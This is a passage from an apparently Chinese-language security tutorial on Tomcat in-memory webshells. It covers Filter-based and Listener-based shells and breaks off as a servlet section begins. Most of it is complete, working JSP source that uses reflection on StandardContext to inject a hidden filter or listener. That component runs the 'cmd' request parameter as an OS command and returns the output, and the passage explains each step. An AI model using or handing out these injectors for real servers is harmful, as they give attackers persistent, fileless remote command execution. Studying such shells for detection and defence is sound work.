class="type">String</span> <span class="variable">filterName</span> <span class="operator">=</span> getRandomString();</span><br><span class="line">    <span class="keyword">if</span> (filterConfigs.get(filterName) == <span class="literal">null</span>) &#123;</span><br><span class="line">        <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Filter</span>() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(FilterConfig filterConfig)</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">destroy</span><span class="params">()</span> &#123;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest servletRequest, ServletResponse servletResponse, FilterChain filterChain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">                <span class="type">HttpServletRequest</span> <span class="variable">httpServletRequest</span> <span class="operator">=</span> (HttpServletRequest) servletRequest;</span><br><span class="line">                <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> httpServletRequest.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> Runtime.getRuntime().exec(<span class="string">&quot;cmd /c &quot;</span> + cmd).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">output</span> <span class="operator">=</span> s.hasNext() ? s.next() : <span class="string">&quot;&quot;</span>;</span><br><span class="line">                    servletResponse.setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> servletResponse.getWriter();</span><br><span class="line">                    out.println(output);</span><br><span class="line">                    out.flush();</span><br><span class="line">                    out.close();</span><br><span class="line">                &#125;</span><br><span class="line">                filterChain.doFilter(servletRequest, servletResponse);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">        filterDef.setFilterName(filterName);</span><br><span class="line">        filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">        filterDef.setFilter(filter);</span><br><span class="line">        standardContext.addFilterDef(filterDef);</span><br><span class="line">        <span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">        filterMap.setFilterName(filterName);</span><br><span class="line">        filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">        filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">        standardContext.addFilterMapBefore(filterMap);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">        constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        <span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">        filterConfigs.put(filterName, applicationFilterConfig);</span><br><span class="line">        out.print(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Malicious filter injection successful!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Filter name: &quot;</span> + filterName + <span class="string">&quot;&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Below is a list displaying filter names and their corresponding URL patterns:&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;table border=&#x27;1&#x27;&gt;&quot;</span>);</span><br><span class="line">        out.println(<span class="string">&quot;&lt;tr&gt;&lt;th&gt;Filter Name&lt;/th&gt;&lt;th&gt;URL Patterns&lt;/th&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">        List&lt;String[]&gt; allUrlPatterns = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Object filterConfigObj : filterConfigs.values()) &#123;</span><br><span class="line">            <span class="keyword">if</span> (filterConfigObj <span class="keyword">instanceof</span> ApplicationFilterConfig) &#123;</span><br><span class="line">                <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) filterConfigObj;</span><br><span class="line">                <span class="type">String</span> <span class="variable">filtername</span> <span class="operator">=</span> filterConfig.getFilterName();</span><br><span class="line">                <span class="type">FilterDef</span> <span class="variable">filterdef</span> <span class="operator">=</span> standardContext.findFilterDef(filtername);</span><br><span class="line">                <span class="keyword">if</span> (filterdef != <span class="literal">null</span>) &#123;</span><br><span class="line">                    FilterMap[] filterMaps = standardContext.findFilterMaps();</span><br><span class="line">                    <span class="keyword">for</span> (FilterMap filtermap : filterMaps) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (filtermap.getFilterName().equals(filtername)) &#123;</span><br><span class="line">                            String[] urlPatterns = filtermap.getURLPatterns();</span><br><span class="line">                            allUrlPatterns.add(urlPatterns); <span class="comment">// 将当前迭代的urlPatterns添加到列表中</span></span><br><span class="line"></span><br><span class="line">                            out.println(<span class="string">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span> + filtername + <span class="string">&quot;&lt;/td&gt;&quot;</span>);</span><br><span class="line">                            out.println(<span class="string">&quot;&lt;td&gt;&quot;</span> + String.join(<span class="string">&quot;, &quot;</span>, urlPatterns) + <span class="string">&quot;&lt;/td&gt;&lt;/tr&gt;&quot;</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        out.println(<span class="string">&quot;&lt;/table&gt;&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String[] urlPatterns : allUrlPatterns) &#123;</span><br><span class="line">            <span class="keyword">for</span> (String pattern : urlPatterns) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!pattern.equals(<span class="string">&quot;/*&quot;</span>)) &#123;</span><br><span class="line">                    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;shell: http://localhost:8080/test&quot;</span> + pattern + <span class="string">&quot;?cmd=ipconfig&lt;br&gt;&quot;</span>);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">private</span> String <span class="title function_">getRandomString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">characters</span> <span class="operator">=</span> <span class="string">&quot;abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">        <span class="type">StringBuilder</span> <span class="variable">randomString</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">StringBuilder</span>();</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; <span class="number">8</span>; i++) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">index</span> <span class="operator">=</span> (<span class="type">int</span>) (Math.random() * characters.length());</span><br><span class="line">            randomString.append(characters.charAt(index));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> randomString.toString();</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>这里需要分析一下context是如何获取的。直接参考W01fh4cker师傅的分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"><span class="type">Field</span> <span class="variable">appctx</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appctx.get(servletContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">stdctx</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">stdctx.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) stdctx.get(applicationContext);</span><br><span class="line"><span class="type">Field</span> <span class="variable">filterConfigsField</span> <span class="operator">=</span> standardContext.getClass().getDeclaredField(<span class="string">&quot;filterConfigs&quot;</span>);</span><br><span class="line">filterConfigsField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Map</span> <span class="variable">filterConfigs</span> <span class="operator">=</span> (Map) filterConfigsField.get(standardContext);</span><br></pre></td></tr></table></figure>
<p>先是获取当前的servlet上下文并拿到其私有字段context，然后设置可访问，这样就可以通过反射这个context字段的值，这个值是一个ApplicationContext对象；接着获取ApplicationContext的私有字段context并设置可访问，然后通过反射获取ApplicationContext的context字段的值，这个值是一个StandardContext对象；最后是获取StandardContext的私有字段filterConfigs，设置可访问之后通过反射获取StandardContext的filterConfigs字段的值。</p>
<p>然后是这段代码：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">FilterDef</span> <span class="variable">filterDef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterDef</span>();</span><br><span class="line">filterDef.setFilterName(filterName);</span><br><span class="line">filterDef.setFilterClass(filter.getClass().getName());</span><br><span class="line">filterDef.setFilter(filter);</span><br><span class="line">standardContext.addFilterDef(filterDef);</span><br><span class="line"><span class="type">FilterMap</span> <span class="variable">filterMap</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FilterMap</span>();</span><br><span class="line">filterMap.setFilterName(filterName);</span><br><span class="line">filterMap.addURLPattern(<span class="string">&quot;/*&quot;</span>);</span><br><span class="line">filterMap.setDispatcher(DispatcherType.REQUEST.name());</span><br><span class="line">standardContext.addFilterMapBefore(filterMap);</span><br><span class="line"><span class="type">Constructor</span> <span class="variable">constructor</span> <span class="operator">=</span> ApplicationFilterConfig.class.getDeclaredConstructor(Context.class, FilterDef.class);</span><br><span class="line">constructor.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">applicationFilterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig) constructor.newInstance(standardContext, filterDef);</span><br><span class="line">filterConfigs.put(filterName, applicationFilterConfig);</span><br></pre></td></tr></table></figure>
<p>也就是定义我们自己的filterDef和FilterMap并加入到srandardContext中，接着反射获取 ApplicationFilterConfig 类的构造函数并将构造函数设置为可访问，然后创建了一个 ApplicationFilterConfig 对象的实例，接着将刚刚创建的实例添加到过滤器配置的 Map 中，filterName 为键，这样就可以将动态创建的过滤器配置信息加入应用程序的全局配置中。</p>
<p>需要注意的是，在tomcat 7及以前FilterDef和FilterMap这两个类所属的包名是：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.deploy.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>tomcat 8及以后，包名是这样的：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterMap&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.descriptor.web.FilterDef&quot;</span> %&gt;</span><br></pre></td></tr></table></figure>
<p>由于这方面的区别，最好是直接都用反射去写这个filter内存马，具体demo参考：</p>
<p><a target="_blank" rel="noopener" href="https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java">https://github.com/feihong-cs/memShell/blob/master/src/main/java/com/memshell/tomcat/FilterBasedWithoutRequestVariant.java</a></p>
<p>还有个需要注意的点就是，我给出的这个demo代码只适用于tomcat 7及以上，因为 filterMap.setDispatcher(<a target="_blank" rel="noopener" href="http://DispatcherType.REQUEST.name">DispatcherType.REQUEST.name</a>());这行代码中用到的DispatcherType是在Servlet 3.0规范中才有的。</p>
<p>通用内存马文章参考：</p>
<p><a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/9914">https://xz.aliyun.com/t/9914</a></p>
<p><a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ">https://mp.weixin.qq.com/s/sAVh3BLYNHShKwg3b7WZlQ</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/CoLo/p/16840371.html">https://www.cnblogs.com/CoLo/p/16840371.html</a></p>
<p><a target="_blank" rel="noopener" href="https://flowerwind.github.io/2021/10/11/tomcat6">https://flowerwind.github.io/2021/10/11/tomcat6</a>、7、8、9内存马/</p>
<p><a target="_blank" rel="noopener" href="https://9bie.org/index.php/archives/960/">https://9bie.org/index.php/archives/960/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/xiaopan233/GenerateNoHard">https://github.com/xiaopan233/GenerateNoHard</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell">https://github.com/ax1sX/MemShell/tree/main/TomcatMemShell</a></p>
<h3 id="2-2Listener-内存马">2.2Listener 内存马</h3>
<h4 id="2-2-1-什么是-Listener？">2.2.1 什么是 Listener？</h4>
<p>Listener 是 Java Servlet 规范中的一部分，它提供了一种机制，使开发者能够编写监听器类来监听容器事件，并在事件发生时执行相应的逻辑。这样的机制使得我们能够在不修改源代码的情况下，通过监听器对现有应用程序进行扩展或增强。</p>
<h4 id="2-2-2-Listener-类型">2.2.2 Listener 类型</h4>
<p>Java 提供了几种类型的 Listener，其中最常见的有以下三种：</p>
<ul>
<li><strong>ServletContextListener（上下文监听器）</strong>：用于监听 Web 应用程序的启动和关闭事件。</li>
<li><strong>HttpSessionListener（会话监听器）</strong>：用于监听会话的创建和销毁事件。</li>
<li><strong>ServletRequestListener（请求监听器）</strong>：用于监听请求的创建和销毁事件。</li>
</ul>
<h4 id="2-2-3编写一个demo来学习">2.2.3编写一个demo来学习</h4>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@WebListener(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">listenerdemo</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestDestroyed(sre);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        ServletRequestListener.<span class="built_in">super</span>.requestInitialized(sre);</span><br><span class="line">        System.out.println(<span class="string">&quot;chufa  listener !!!&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>web.xml配置</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--listener 注册--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">listener</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">listener-class</span>&gt;</span>com.example.tomcat_demo_neicunma.filterdemo<span class="tag">&lt;/<span class="name">listener-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">listener</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>启动起来会触发，每一次请求都会触发</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104151402-8fb5e5f2-cadc-4b70-9801-51b1c1b8d87e.png" alt=""></p>
<h4 id="2-2-4调试分析">2.2.4调试分析</h4>
<p>还是像前面分析的一样，看listener是如何调用执行的</p>
<p>这里参考在调用到listenerstart方法之前的跟踪和调用</p>
<p><a target="_blank" rel="noopener" href="https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/">https://drun1baby.top/2022/08/27/Java%E5%86%85%E5%AD%98%E9%A9%AC%E7%B3%BB%E5%88%97-04-Tomcat-%E4%B9%8B-Listener-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC/</a></p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716105178459-4f416b76-0e6e-49d6-903b-669fef4817d0.png" alt=""></p>
<p>在ContexConfig这个类的configureContext方法里的addApplicationListener加载了web.xml文件中的listener配置读取完配置文件之后standarcontext回去调用listenerStart方法</p>
<p>开始打下断点然后进行调试</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716104469192-8054c239-d1d1-4c38-8b72-7efe4ff910db.png" alt=""></p>
<p>我们直接找到listenerStart方法</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109108992-fdb1afc5-8bad-4a14-86a4-ac60415792b7.png" alt=""></p>
<p>可以看到该方法的第一行意思其实就是获取已经加载的listener也就web.xml中配置的监听器，接着往下看他对监听器做了一些分类有事件监听器和声明周期监听器等。紧接着我们看下面一段代码</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109216065-90a643e9-d000-4e47-9013-db18dc7671b8.png" alt=""></p>
<p>红框中圈出来的这段代码就是在遍历getApplicationEventListeners()获取applicationEventListenersList中的值，然后再设置applicationEventListenersList，可以理解为applicationEventListenersList加上刚刚实例化的eventListeners:<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109329399-55c17b08-0fed-4c30-abc3-c702ae669db6.png" alt=""></p>
<p>这是getApplicationEventListeners方法的内容就是将applicationEventsListener转换成包含任意类型的对象数组。那这总结起来就一句话，就是Listener有两个来源，一是根据web.xml文件或者@WebListener注解实例化得到的Listener；二是applicationEventListenersList中的Listener。前面的我们肯定没法控制，因为这是给开发者用的，不是给黑客用的哈哈哈。那就找找看，有没有类似之前我们用到的addFilterConfig这种函数呢？当然是有的，<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109567639-27d5f88f-83a7-40d5-a775-f4addcd1d8df.png" alt=""></p>
<p>可以看到是有的。所以就可以通过获取standardcontext对象添加我们自定义的监听器</p>
<p>我们继续向后跟在调用到我们自己的监听器时发现是由<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109893759-55866782-6b6c-4ed2-8fc2-fba462e12ab7.png" alt="">fireRequestinitEvent方法触发的跟进这个方法看看</p>
<p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1716109992407-ffa0c485-24f8-40c7-acef-846ab4a6415f.png" alt=""></p>
<p>发现其会调用getApplicationEventListeners()并调用其中所有的ServletRequestListener.requestInitialized()</p>
<p>来总结一下：</p>
<p>Listener来源于tomcat初始化时从web.xml实例化的Listener和applicationEventListenersList中的Listener，前者我们无法控制，但是后者我们可以控制，只需要往applicationEventListenersList中加入我们的恶意Listener即可。实际上StandardContext存在addApplicationEventListener()方法可以直接给我们调用，往applicationEventListenersList中加入Listener。</p>
<p>所以我们的Listener内存马实现步骤:</p>
<ul>
<li>
<p>继承并编写一个恶意Listener</p>
</li>
<li>
<p>获取StandardContext</p>
</li>
<li>
<p>调用StandardContext.addApplicationEventListener()添加恶意Listener</p>
</li>
</ul>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.InputStream&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.util.Scanner&quot;</span> %&gt;</span><br><span class="line"></span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">EvilListener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="keyword">if</span> (req.getParameter(<span class="string">&quot;cmd&quot;</span>) != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    in = Runtime.getRuntime().exec(<span class="keyword">new</span> <span class="title class_">String</span>[]&#123;<span class="string">&quot;cmd.exe&quot;</span>,<span class="string">&quot;/c&quot;</span>,req.getParameter(<span class="string">&quot;cmd&quot;</span>)&#125;).getInputStream();</span><br><span class="line">                    <span class="type">Scanner</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Scanner</span>(in, <span class="string">&quot;GBK&quot;</span>).useDelimiter(<span class="string">&quot;\\A&quot;</span>);</span><br><span class="line">                    <span class="type">String</span> <span class="variable">out</span> <span class="operator">=</span> s.hasNext()?s.next():<span class="string">&quot;&quot;</span>;</span><br><span class="line">                    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                    <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request)requestF.get(req);</span><br><span class="line">                    request.getResponse().setCharacterEncoding(<span class="string">&quot;GBK&quot;</span>);</span><br><span class="line">                    request.getResponse().getWriter().write(out);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">catch</span> (Exception ignored) &#123;&#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line"></span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">    <span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">    context.addApplicationEventListener(evilListener);</span><br><span class="line">    out.println(<span class="string">&quot;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Inject Listener Memory Shell successfully!&lt;br&gt;[+]&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;Shell url: http://localhost:8080/test/?cmd=ipconfig&quot;</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>
<p>关键代码分析</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"><span class="type">EvilListener</span> <span class="variable">evilListener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">EvilListener</span>();</span><br><span class="line">context.addApplicationEventListener(evilListener);</span><br></pre></td></tr></table></figure>
<p>前面四行代码干一件事：获取StandardContext；后两行干代码干这两件事：实例化我们编写的恶意Listener，调用addApplicationEventListener方法加入到applicationEventListenersList中去，这样最终就会到eventListener。</p>
<p>参考：<a target="_blank" rel="noopener" href="http://wjlshare.com/archives/1651">http://wjlshare.com/archives/1651</a></p>
<p><a target="_blank" rel="noopener" href="https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/">https://longlone.top/%E5%AE%89%E5%85%A8/java/java%E5%AE%89%E5%85%A8/%E5%86%85%E5%AD%98%E9%A9%AC/Tomcat-Listener%E5%9E%8B/</a></p>
<p><a target="_blank" rel="noopener" href="https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#331-%E7%AE%80%E5%8D%95%E7%9A%84listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99">https://github.com/W01fh4cker/LearnJavaMemshellFromZero?tab=readme-ov-file#331-%E7%AE%80%E5%8D%95%E7%9A%84listener%E5%86%85%E5%AD%98%E9%A9%ACdemo%E7%BC%96%E5%86%99</a></p>
<h3 id="2-3servlet内存马">2.3servlet内存马</h3>
<h4 id="2-3-1什么是servlet">2.3.1什么是servlet</h4>
<p>先梳理下servlet的概念吧，在前置基础中也有介绍到，这里就简单叙述一下</p>
<p>Java Servlet 是运行在 Web 服务器或应用服务器上的程序，它是作为来自 Web 浏览器或其他 HTTP 客户端的请求和 HTTP 服务器上的数据库或应用程序之间的中间层。</p>
